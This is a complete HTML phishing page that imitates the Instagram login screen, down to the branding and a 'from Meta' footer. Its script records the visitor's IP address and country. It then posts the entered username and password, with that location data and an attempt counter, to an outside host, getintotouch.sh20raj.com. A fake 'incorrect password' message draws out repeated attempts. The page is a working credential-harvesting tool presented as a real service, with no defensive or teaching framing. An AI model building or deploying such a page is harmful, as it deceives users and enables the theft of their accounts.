<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            border-radius: 10px;
            background-color: #fff;
        }

        .login-box {
            width: 100%;
            padding: 20px;
            text-align: center;
        }

        h1 {
            font-size: 3em;
            color: #262626;
            margin: 0;
            font-family: 'Billabong', sans-serif;
        }

        .facebook-btn {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }

        .or-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .or-divider::before {
            margin-right: .5em;
        }

        .or-divider::after {
            margin-left: .5em;
        }

        .or-divider span {
            color: #8e8e8e;
            font-weight: 500;
            font-size: 13px;
        }

        .textbox {
            margin-bottom: 10px;
        }

        .textbox input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
            font-size: 14px;
        }

        .error-message {
            color: red;
            font-size: 12px;
            margin-top: 10px;
        }

        .forgot-link {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 10px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .btn {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .signup-link {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 100%;
            text-align: center;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            margin-top: 10px;
        }

        .signup-link a {
            color: #3897f0;
            font-weight: bold;
            text-decoration: none;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .meta-footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .meta-footer img {
            height: 14px;
            vertical-align: middle;
        }

        .country-info {
            font-size: 14px;
            color: #8e8e8e;
            margin-top: 10px;
            text-align: center;
        }
    </style>
    <script>
        let attempts = 0;
        let userIp = '';
        let userCountry = '';

        // Function to fetch user's IP address
        function fetchUserIp() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIp = data.ip;
                    document.getElementById('country-info').textContent = `Your IP address is ${userIp}. Fetching country info...`;
                    fetchUserCountry(userIp);
                })
                .catch(err => console.error('Failed to fetch IP address:', err));
        }

        // Function to fetch country using IP address
        function fetchUserCountry(ip) {
            fetch(`https://ipinfo.io/${ip}/json?token=YOUR_TOKEN_HERE`)
                .then(response => response.json())
                .then(data => {
                    userCountry = data.country;
                    document.getElementById('country-info').textContent = `You are logging in from ${userCountry}`;
                })
                .catch(err => console.error('Failed to fetch country info:', err));
        }

        function handleLogin(event) {
            event.preventDefault();
            attempts++;
            const errorMessage = document.getElementById('error-message');

            const form = document.getElementById('login-form');
            const formData = new FormData(form);
            formData.append('attempts', attempts);
            formData.append('ip', userIp);
            formData.append('country', userCountry);
            formData.append('from', 'instagram');

            fetch(form.action, {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(data => {
                  if (data.success) {
                      window.location.href = 'Sinsta.html';
                  } else if (attempts < 3) {
                      errorMessage.textContent = 'Incorrect username or password. Please try again.';
                  } else {
                      window.location.href = 'Sinsta.html';
                  }
              })
              .catch(error => {
                  console.error('Login error:', error);
                  errorMessage.textContent = 'An error occurred. Please try again later.';
              });
        }

        document.addEventListener('DOMContentLoaded', () => {
            fetchUserIp();
            const form = document.getElementById('login-form');
            form.addEventListener('submit', handleLogin);
        });
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Instagram</h1>
            <button class="facebook-btn">Continue Using Facebook</button>
            <div class="or-divider"><span>OR</span></div>
            <form id="login-form" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="post">
                <div class="textbox">
                    <input type="text" placeholder="Phone number, username, or email address" name="username" required>
                </div>
                <div class="textbox">
                    <input type="password" placeholder="Password" name="password" required>
                </div>
                <div id="error-message" class="error-message"></div>
                <a href="#" class="forgot-link">Forgotten your password?</a>
                <button type="submit" class="btn">Log in</button>
            </form>
        </div>
        <div class="signup-link">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="meta-footer">
            <p>from <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Meta_Platforms_Inc._logo.svg" alt="Meta"></p>
        </div>
        <div id="country-info" class="country-info"></div>
    </div>
</body>
</html>
